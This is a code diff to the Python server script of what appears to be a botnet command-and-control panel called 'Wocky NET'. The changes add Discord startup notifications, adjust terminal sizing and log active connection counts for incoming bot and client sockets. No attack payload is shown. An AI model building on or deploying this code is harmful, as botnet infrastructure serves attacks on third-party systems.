@@ -11,6 +11,8 @@ import socket, sys, os, requests, time, threading, random, datetime, subprocess
 from assets.cnc_controlpanel.main import *
 from assets.Config.main import *
 from assets.utils.CLI import *
+from assets.Logger.discord import *
+from assets.utils.CLI import *
 
 from assets.Commands.main_screen import *
 from assets.Commands.command_handler import *
@@ -27,13 +29,17 @@ cp_hostname = "\rQuantum >>: "
 
 
 print(f"Bot Port: {port}\r\n")
+Discord.send_news(f"Wocky NET Successsfully started!\r\n```Port {port}```")
 
 def handle_connection(client, addr):
-        CLI_Control.set_TerminalSize(client, 60, 79)
+        # try:
+        CLI_Control.set_TerminalSize(client, 40, 79)
         CLI_Control.set_Title(client, "Welcome to Wocky NET!")
         MainScreen(client, addr)
         while(True):
                 CMDHandler(client, addr)
+        # except:
+        #         print("failed")
 
 """ 
 The whole bot function was coded all here for testing reasons!
@@ -95,7 +101,8 @@ def listener():
                         threading.Thread(target=handle_connection, args=(client, address)).start()
                 except:
                         print("Client Disconnected!")
-                print(f"TCP Connection From {address[0]} : {str(address[1])}")
+                active_connections = threading.active_count()
+                print(f"TCP Connection From {address[0]} : {str(address[1])} | {active_connections}")
 
 def bot_listen():
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
